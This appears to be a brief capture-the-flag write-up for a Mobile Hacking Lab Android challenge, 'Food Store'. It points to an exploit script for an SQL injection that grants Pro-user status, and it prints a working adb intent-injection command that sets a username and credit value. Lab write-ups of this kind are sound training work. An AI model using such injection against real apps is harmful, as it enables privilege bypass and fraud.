# Writeup for Guess me challenge.

>here's how to use the scripts only as proof of concept.

Check the full Writeup at my blog --> [Food Store](https://blog.parad0x.vip/blog/2024/08/15/FoodStore.html)
---

## Objective
Exploit the SQL Injection vulnerability, allowing you to register as a Pro user, bypassing standard user restrictions.

## SQL injection

Just run:`./exploit.sh`
Make sure that the android device is connected and the adb is running.

![SQLi](https://parad0x-0xff.github.io/MHL/FoodStore/MHL_foodStore_4.png)

## BONUS INTENT EXPLOIT
The following command will open the app and by sending a crafted deep link

```sh
adb shell am start \
-n com.mobilehackinglab.foodstore/.MainActivity \
--es USERNAME "parad0x" \
--ei USER_CREDIT "1337"
```

![Intent Injection](https://parad0x-0xff.github.io/MHL/FoodStore/MHL_foodStore_5.png)

## Conclusion

On my blog, I'll cover all the steps, how it's possible to change the value on the screen and exploit a SQLi.
